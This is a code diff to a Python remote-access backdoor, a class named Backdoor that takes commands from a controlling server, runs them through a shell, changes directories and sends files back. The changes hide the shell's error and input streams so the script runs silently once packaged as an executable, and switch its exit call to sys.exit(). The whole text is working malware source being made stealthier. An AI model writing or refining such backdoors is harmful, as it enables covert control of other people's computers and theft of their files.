@@ -1,6 +1,6 @@
 #!/usr/bin/env python
 
-import socket, subprocess, json, os, base64
+import socket, subprocess, json, os, base64, sys
 
 
 class Backdoor:
@@ -22,7 +22,12 @@ class Backdoor:
                 continue
 
     def execute_sys_command(self, command):
-        return subprocess.check_output(command, shell=True)
+        # Uncomment the following 2 lines if packaging using python 2
+        # DEVNULL = open(os.devnull, 'wb')
+        # return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
+
+        # Python 3: execute the command and redirect standard error and input to DEVNULL to handle input and errors after packaging the script
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
     def change_working_directory(self, path):
         os.chdir(path)
@@ -43,7 +48,7 @@ class Backdoor:
                 command = self.reliable_receive()
                 if command[0] == "exit":    # If exit command was sent from the server, end the connection
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0] == "cd" and len(command) > 1:   # change directory if command cd is sent from the server
                     command_response = self.change_working_directory(command[1])
                 elif command[0] == "download":  # read the file to download by calling the read_files method
